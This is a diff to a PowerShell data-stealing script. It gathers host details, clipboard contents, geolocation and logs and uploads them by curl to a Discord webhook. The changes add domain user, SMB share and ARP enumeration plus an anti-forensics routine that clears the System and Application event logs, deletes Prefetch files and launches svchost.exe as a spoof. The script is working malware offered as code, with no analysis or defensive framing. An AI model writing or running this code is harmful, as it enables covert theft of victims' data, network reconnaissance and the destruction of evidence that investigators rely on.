@@ -171,7 +171,7 @@ Get-WinEvent -FilterHashtable @{LogName='System';ID=2003,2100,2102,2106,400,410,
     "Time: $($_.TimeCreated), Message: $($_.Message)"
 } | Out-File -Append $OutFilePC
 
-# Get installed software
+# ---- Get installed software ----
 Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
 Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
 Out-File -Append $OutFilePC
@@ -196,6 +196,16 @@ if ($antiviruses) {
     "No antivirus products detected, or script must be run with Administrator privileges." | Out-File -Append $OutFile
 }
 
+function EnumNetwork {
+    if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
+        Get-ADUser -Filter * | Select-Object SamAccountName, DistinguishedName | Out-File -Append $OutFile
+        Get-SmbShare | Select-Object Name, Path | Out-File -Append $OutFile
+    }
+    arp -a | Out-File -Append $OutFile
+    "`n" | Out-File -Append $OutFile 
+}
+EnumNetwork
+
 $PublicIP = (Invoke-RestMethod -Uri "https://api.ipify.org")
 Write-Output "Public IP Address: $PublicIP `n" | Out-File -Append $OutFile
 
@@ -215,6 +225,7 @@ ISP:          $($geo.isp)
 Org:          $($geo.org)
 AS:           $($geo.as)
 Query IP:     $($geo.query)
+`n
 "@
 $locationInfo | Out-File -Append $OutFile
 
@@ -257,11 +268,23 @@ $HtmlContent = @"
 $HtmlPath = "$env:USERPROFILE\Documents\DeviceLocation.html"
 $HtmlContent | Out-File -Encoding utf8 $HtmlPath
 
-Write-Output "System report created on your Desktop as System_Report.txt"
-Write-Output "Google Maps location HTML created on your Desktop as DeviceLocation.html"
+Write-Output "System report created as System_Report.txt"
+Write-Output "Google Maps location HTML created as DeviceLocation.html"
 
-$webhookuri = "WEBHOOK_URI"
+function AntiForensics {
+    try {
+        $null = [Diagnostics.Process]::Start("svchost.exe", "")  # Spoof as svchost
+        wevtutil cl System
+        wevtutil cl Application
+        Remove-Item "$env:SYSTEMROOT\Prefetch\*" -Force -ErrorAction SilentlyContinue
+    }
+    catch {}
+}
+
+$webhookuri = "DISCORD_WEBHOOK"
 
 curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" $webhookuri
 
 @($OutFile, $OutFileClip, $OutFilePC, $HtmlPath) | ForEach-Object { Remove-Item -Path $_ -Force }
+
+AntiForensics
